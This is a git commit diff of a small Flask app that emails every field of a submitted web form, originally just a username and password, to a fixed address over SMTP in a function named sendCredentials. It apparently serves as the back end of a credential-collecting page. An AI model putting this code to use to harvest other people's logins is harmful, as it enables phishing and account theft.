abe87e9d76204a48de0d55442fa786934020e1e0
KyleBehiels <behielsk15@mytru.ca>
2017-05-07 17:36:23 -0700

    Version control is cool

--- logic.py
+++ logic.py
@@ -2,26 +2,27 @@ from flask import Flask, render_template, request
 import smtplib
 
 logic = Flask(__name__)
-
 #Read the variables in variables.txt and store them in a list
-def getConfigVariables():
-	file_obj = open('variables.txt', 'r')
-	index = 0
-	SMTPInformation = list()
+file_obj = open('variables.txt', 'r')
+index = 0
+SMTPInformation = list()
 
-	for line in file_obj:
-		SMTPInformation.append((line.split(':'))[1].strip())
+for line in file_obj:
+	SMTPInformation.append((line.split(':'))[1].strip())
 
-	#Assign the variables names for concise access
-	senderEmail = SMTPInformation[0]
-	senderPassword = SMTPInformation[1]
-	senderServer = SMTPInformation[2]
-	senderPort = SMTPInformation[3]
+file_obj.close()
+#Assign the variables names for concise access
+senderEmail = SMTPInformation[0]
+senderPassword = SMTPInformation[1]
+senderServer = SMTPInformation[2]
+senderPort = SMTPInformation[3]
 
 #The method that sets up the SMTP connection and sends the credentials.
-def sendCredentials(user, password):
+def sendCredentials(allFields):
 	#Set message to a formatted String that includes the email header and content
-	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
+	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'
+	for key in allFields:
+		message = message+" " +key+" : "+allFields[key]
 	#Open the connection and send the credentials
 	server = smtplib.SMTP(senderServer+':'+senderPort)
 	server.ehlo
@@ -29,6 +30,7 @@ def sendCredentials(user, password):
 	server.login(senderEmail,senderPassword)
 	server.sendmail(senderEmail, senderEmail, message)
 	server.quit() #Close the connection
+
 
 #Index page for debugging (Not sure how implement that functionality)
 @logic.route('/index')
@@ -39,19 +41,18 @@ def index():
 @logic.route('/form_page', methods=['POST', 'GET'])
 def formPage():
 	if request.method == 'POST':
-		#Get the variables from the POST request
-		username = request.form['username']
-		password = request.form['password']
-		getConfigVariables()
-		sendCredentials(username, password) 
-		return render_template("simple_form.html")
+		try:
+			#Get the variables from the POST request
+			allFields = request.form
+			sendCredentials(allFields) 
+			return render_template("simple_form.html")
+		except Exception, e:
+			return render_template('index.html')
 
 	else:
-
 		return render_template("simple_form.html")
 
 if __name__ == "__main__":
 
 	logic.run()
-
 
